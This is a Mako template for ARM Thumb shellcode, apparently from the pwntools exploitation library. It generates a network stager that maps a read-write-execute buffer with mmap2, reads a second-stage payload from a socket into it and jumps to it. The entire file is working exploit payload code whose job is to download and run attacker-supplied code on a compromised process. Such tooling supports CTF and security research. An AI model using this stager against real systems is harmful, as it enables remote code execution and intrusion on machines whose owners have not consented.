<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import thumb %>
<%docstring>
    stager(sock, size)

    Read 'size' bytes from 'sock' and place them in an executable buffer and jump to it.
    The socket will be left in r6.
</%docstring>
<%page args="sock, size"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
%>
${stager}:
    /* Save socket */
    ${thumb.mov('r6', sock)}

    /* mmap(0, size, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0) */
    ${thumb.mov('r7', 'SYS_mmap2')}
    ${thumb.mov('r0', 0)}
    ${thumb.mov('r1', size)}
    ${thumb.mov('r2', 'PROT_EXEC | PROT_WRITE | PROT_READ')}
    ${thumb.mov('r3', 'MAP_ANONYMOUS | MAP_PRIVATE')}
    ${thumb.mov('r4', -1)}
    ${thumb.mov('r5', 0)}
    svc 1

    /* Save allocated memory address */
    ${thumb.mov('r8', 'r0')}
    ${thumb.mov('r1', 'r0')}

    /* Initialize read loop counter */
    ${thumb.mov('r5', size)}
${looplabel}:
    ${thumb.mov('r7', 'SYS_read')}
    ${thumb.mov('r0', 'r6')}
    ${thumb.mov('r2', 'r5')}
    svc 1

    /* Update remaining count and write-address */
    add r1, r1, r0
    sub r5, r5, r0

    /* Anything left to read */
    cmp r5, #0
    bne ${looplabel}

    /* Jump to next stage */
    ${thumb.mov('r0', 'r8')}
    bx r0
